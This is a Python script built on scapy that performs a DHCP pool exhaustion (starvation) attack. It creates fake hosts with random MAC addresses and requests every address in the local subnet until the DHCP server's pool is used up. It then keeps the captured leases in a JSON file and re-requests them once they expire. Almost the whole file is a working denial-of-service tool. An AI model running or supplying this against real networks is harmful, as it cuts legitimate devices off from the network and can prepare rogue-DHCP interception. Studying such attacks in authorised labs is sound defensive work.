# DHCP server's pool exhaustion, saving results in json file
#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
import time
import json
import threading
import netifaces
import logging
from logging.handlers import TimedRotatingFileHandler
import random
import ipaddress
from datetime import datetime


#### CONFIG #### -------------------------------------------------------------------
iface = "eth0"  # Network interface to spoof
timeout_to_receive_response = 1 # Time to wait until non response is decided
catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results
json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
log_file = "/home/pi/dhcp_starver/logs/pool_exhaustion.log"


#### GLOBAL VARIABLES #### ---------------------------------------------------------
# Dict of all spoofed ip addresses k:IP, v:fake_host
spoofed_ip_dict = dict()

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
our_network = ""


#### EXTRA GLOBAL STUFF #### ------------------------------------------------------
class fake_host:
    """
    Defines basic parameters of a host
    """
    def __init__(self, mac_address, transaction_id):
        self.ip_address = None
        self.mac_address = mac_address
        self.transaction_id = transaction_id
        self.hostname = "elvispresley"
        self.lease_time = None  # IP Address Lease Time offered by DHCP Server
        self.acquisition_time = None  # Time when IP Address was obtained/renewed
        self.is_spoofed = False  # Sets if this host has acquired successfully the IP Address
        self.is_server = False # True when this IP address if from DHCP server's network
    def to_dict(self):
        return {
            "ip_address" : self.ip_address,
            "mac_address" : self.mac_address,
            "transaction_id" : self.transaction_id,
            "hostname" : self.hostname,
            "lease_time" : self.lease_time,
            "acquisition_time" : self.acquisition_time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_spoofed" : self.is_spoofed,
            "is_server" : self.is_server
        }
    @classmethod
    def from_dict(cls, data):
        instance = cls(mac_address=data["mac_address"], transaction_id=data["transaction_id"])
        instance.ip_address = data["ip_address"]
        instance.hostname = data["hostname"]
        instance.lease_time = data["lease_time"]
        instance.acquisition_time = datetime.strptime(data["acquisition_time"], "%Y-%m-%d %H:%M:%S")
        instance.is_spoofed = data["is_spoofed"]
        instance.is_server = data["is_server"]
        return instance

# Define a semaphore for .log/.json file access without collision
file_semaphore = threading.Semaphore()

# Set up logging with rotation policy
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


#### FUNCTIONS #### ----------------------------------------------------------------
def write_to_log(message):
    """
    Write message to log file
    """
    with file_semaphore:
        logger.info(message)


def get_network_params(iface_name):
    """
    Get IP address, MAC address, netmask and network address from selected interface
    """
    try:
        iface = netifaces.ifaddresses(iface_name)
        ip_address = iface[netifaces.AF_INET][0]['addr']
        mac_address = iface[netifaces.AF_LINK][0]['addr']
        network_mask = iface[netifaces.AF_INET][0]['netmask']
        # Obtaining network address
        network_address = ipaddress.ip_network(f"{ip_address}/{network_mask}", strict=False)
        return ip_address, mac_address, network_mask, str(network_address)
    except (KeyError, IndexError):
        return None, None, None


def get_random_mac():
    """
    Returns a string with a "random" MAC address
    """
    mac = "34:" # Our bogus MAC addresses starts with 34 to make it easier to track/debug
    for i in range(10):
        num = random.randint(0, 15)
        if num < 10:
            num = chr(48 + num)
        else:
            num = chr(87 + num)
        mac += num
        if i % 2 == 1:
            mac += ":"
    return mac[:-1]


def get_hosts_from_network(ip_address, netmask):
    """
    Returns a list of all possible assignable IP addresses to hosts on the interface network
    """
    network = ipaddress.IPv4Network(ip_address + "/" + netmask, strict=False)
    # List of avalaible addresses
    address_list = [str(ip_address) for ip_address in network.hosts()] 
    return address_list


def create_fake_host():
    """
    Creates a fake host with random MAC address and Trans ID
    """
    # Getting fresh random MAC addr and transaction ID for all the DHCP transaction process for this fake host
    trans_id = random.getrandbits(32)
    mac_address = get_random_mac()
    # Creating a new fake host with no assigned IP address 
    host = fake_host(mac_address, trans_id)
    return host


def create_broadcast_dhcp_request_packet(host):
    """
    Creates a broadcast DHCP Discover with host's parameters
    """
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    mac_address = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                     ("client_id", b'\x01' + mac_address),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                     ("requested_addr", host.ip_address), 
                                     ("hostname", host.hostname),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
    return dhcp_request


def send_release(host_mac, ip_address):
    """
    Send DHCP Release
    """
    # Getting a random Trans ID
    trans_id = random.getrandbits(32)
    # Converting MAC addresses
    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address,
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address} from {host_mac}")


def is_this_mac_spoofed(mac):
    """
    Retuns True if mac address is from an spoofed host
    """
    for _, host in spoofed_ip_dict.items():
        if host.mac_address == mac:
            return True
    return False


def handle_dhcp_request_response(packet):
    """
    Handles response to DHCP Request packet
    """
    global spoofed_ip_dict
    global dhcp_server_ip, dhcp_server_mac
    
    # Option 5: DHCP ACK, IP address successfully linked to host by router's DHCP server        
    if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
        # Getting client info - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is not for us. Only captured if device is connected to a mirror port or broadcast ACK
        if not is_this_mac_spoofed(host_mac) or host_mac == our_mac_address:
            write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
            return None
        # Updating the fake host's attributes with DHCP server's final decision
        dhcp_opts = get_dhcp_options(packet)
        spoofed_ip_dict[host_ip].ip_address = host_ip
        spoofed_ip_dict[host_ip].lease_time = dhcp_opts['lease_time']
        spoofed_ip_dict[host_ip].acquisition_time = datetime.now()
        spoofed_ip_dict[host_ip].is_spoofed = True
        # Updating DHCP server's params
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src
        write_to_log(f"ACK received: {host_ip} successfully linked to {host_mac}")

    # Option 6: DHCP NAK, unable to obtain a dynamic IP address
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 6:
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        write_to_log(f"NAK received: {host_mac} IP address' acquisition rejected")


def mac_to_str(bytes_value):
    """
    Converts bytes sequence to standard hex MAC address format (ff:ff:ff:ff:ff:ff)
    """
    hex_string = ''.join('{:02x}'.format(byte) for byte in bytes_value)
    formatted_mac_address = ':'.join(hex_string[i:i+2] for i in range(0, 12, 2))
    return formatted_mac_address


def get_dhcp_options(packet):
    """
    Returns a dict with the DHCP packet's DHCP Options
    """
    dhcp_opts = packet.getlayer(scapy.DHCP).fields["options"]
    dhcp_opts_dict = dict()
    for opt in dhcp_opts:
        # Obtaining all DHCP options until option "end"
        if opt == "end":
            break
        if isinstance(opt, tuple):
            # Ignoring other variables inside a same option, like 2nd DNS Servers, etc. Not useful right now
            dhcp_opts_dict[opt[0]] = opt[1]
        else:
            pass
    return dhcp_opts_dict


def remove_unused_fake_hosts():
    """
    Removes fake hosts with no IP address assigned by DHCP Server
    """
    host_to_remove = []
    global spoofed_ip_dict
    for ip, fake_host in spoofed_ip_dict.items():
        if not fake_host.is_spoofed:
            host_to_remove.append(ip)
    for ip in host_to_remove:
        del spoofed_ip_dict[ip]


def pool_exhaustion_with_request(ip_list):
    """
    Sends an DHCP Request for every IP address on ip_list list
    """
    for ip in ip_list:
        # Create a new ficticious host and adds it to the dictionary
        fake_host = create_fake_host()
        fake_host.ip_address = ip
        spoofed_ip_dict[ip] = fake_host
        # Create Broadcast DHCP packet
        dhcp_request_packet = create_broadcast_dhcp_request_packet(fake_host)
        # Sends packet and wait to response
        scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
        write_to_log(f"Request sent: {fake_host.mac_address} requesting {ip}")
        dhcp_response = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=timeout_to_receive_response)
        #dhcp_response = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=10, prn=lambda x: x.sniffed_on+": "+x.summary())

        if dhcp_response:
            handle_dhcp_request_response(dhcp_response[0])
        else:
            write_to_log(f"Timeout exceeded: Non response received")

       
def release_all_ips():
    """
    Sends a DHCP Release for every fake host with an IP address linked
    """
    write_to_log(f"Releasing all spoofed IP addresses:")
    global spoofed_ip_dict
    for ip, host in spoofed_ip_dict.items():
        if host.is_spoofed:
            send_release(host.mac_address, ip)
            # Updating spoofed host's dict
            spoofed_ip_dict[ip].is_spoofed = False
            time.sleep(0.25)
    write_to_log(f"All IP addresses have been released!")
    

def load_from_json(file_path):
    """
    Load json file contents to a dictionary
    """
    # Load json contents to a dictionary
    write_to_log(f"Loading results from {file_path}")
    with file_semaphore:
        with open(file_path, 'r') as file:
            data = json.load(file)
    # Create fake_host dict with fake_host objects
    spoofed_host_dict = {}
    for ip, host_data in data.items():
        spoofed_host_dict[ip] = fake_host.from_dict(host_data)
    return spoofed_host_dict


def save_to_json(results, file_path):
    """
    Saves fake_host dictionary to a json file
    """
    serializable_dict = {ip: host.to_dict() for ip, host in results.items()}
    with file_semaphore:
        with open(file_path, 'w') as file:
            json.dump(serializable_dict, file, indent=4)
    write_to_log(f"Results saved in {file_path}")


def check_if_spoof_is_needed(available_hosts):
    """
    Checks IP acquisition time to decide if spoof is needed. 
    Retuns a list of IP addresses to be spoofed.
    """
    global spoofed_ip_dict
    try:
        write_to_log(f"Checking if host spoof is expired:")
        spoofed_ip_dict = load_from_json(json_file)
    except FileNotFoundError:
        write_to_log(f"File not found: {json_file}")
        spoofed_ip_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {e}")
        spoofed_ip_dict = {}
    try:
        time_now = datetime.now()
        # List of IP addresses already spoofed
        spoofed_ip_addresses = []
        # List of fake_host's IP address with an out of date spoof
        hosts_with_expired_spoof = []
        for ip, host in spoofed_ip_dict.items():
            # Comparing acquisition time to time now
            time_diff = (time_now - host.acquisition_time).total_seconds()
            if time_diff > host.lease_time or not host.is_spoofed:
                # Making sure it's not DHCP server
                if not host.is_server:
                    # Spoof is needed. Adding IP address to list
                    hosts_with_expired_spoof.append(ip)
            else:
                # Spoof for this IP address is not needed. Adding its IP address to list
                spoofed_ip_addresses.append(host.ip_address)
        # Removing expired spoofed host from dictionary
        if hosts_with_expired_spoof:
            write_to_log(f"IP addresses that need re-spoofing:")
            for ip in hosts_with_expired_spoof:
                write_to_log(f"{spoofed_ip_dict[ip].ip_address}")
                del spoofed_ip_dict[ip]
        else:
            write_to_log(f"Already spoofed IP addresses are up to date. Skypping that addresses on exhaustion")
        # Removing spoofed IP addresses from avalaible_host list to spoof
        if spoofed_ip_addresses:
            available_hosts = [ip for ip in available_hosts if ip not in spoofed_ip_addresses]
  
    except Exception as e:
        write_to_log(f"Error during spoof need checking: {e}")
    finally:
        return available_hosts


def update_json_file(updated_ip_dict, file_path):
        """
        Update json file with new information. Load + Update + Save
        """
        try:
            dict_on_file = load_from_json(file_path)
        except FileNotFoundError:
            write_to_log(f"File not found: {file_path}")
            dict_on_file = {}
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {e}")
            dict_on_file = {}
        for ip, host in updated_ip_dict.items():
            #if ip in dict_on_file:
                # If host exists, updating it's info
            #    dict_on_file[ip] = host       
            dict_on_file[ip] = host   
        # Save updated dict to file
        save_to_json(dict_on_file, file_path)


def main():

    write_to_log(f"Starting service")
    # Getting interface parameters
    global our_ip_address, our_mac_address, our_netmask, our_network
    our_ip_address, our_mac_address, our_netmask, our_network = get_network_params(iface)
    write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
    # Getting all host avalaible IP addresses for network
    available_hosts = get_hosts_from_network(our_ip_address, our_netmask)
    # Check previous spoofed host in json file to decide if pool exhaustion is needed for every existing ip address on network
    ip_list_to_spoof = check_if_spoof_is_needed(available_hosts)
    
    try:
        # Pool exhaustion: getting all avalaible IP from DHCP server's pool
        write_to_log(f"Starting DHCP Pool exhaustion")
        pool_exhaustion_with_request(ip_list_to_spoof)
        write_to_log(f"Pool exhaustion completed")
        # Removing unspoofed hosts
        remove_unused_fake_hosts()

        # Updating json file with updated host information
        global spoofed_ip_dict
        update_json_file(spoofed_ip_dict, json_file)
        #save_to_json(spoofed_ip_dict, json_file)

        # If True releases all ip addresses 
        if catch_and_release:
            time.sleep(5)
            #global spoofed_ip_dict
            spoofed_ip_dict = load_from_json(json_file)
            release_all_ips()
            remove_unused_fake_hosts()
            save_to_json(spoofed_ip_dict, json_file)
    
    except Exception as e:

        print(e)
        #release_all_ips() 

    finally:
        
        write_to_log(f"Service terminated")
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service manually terminated")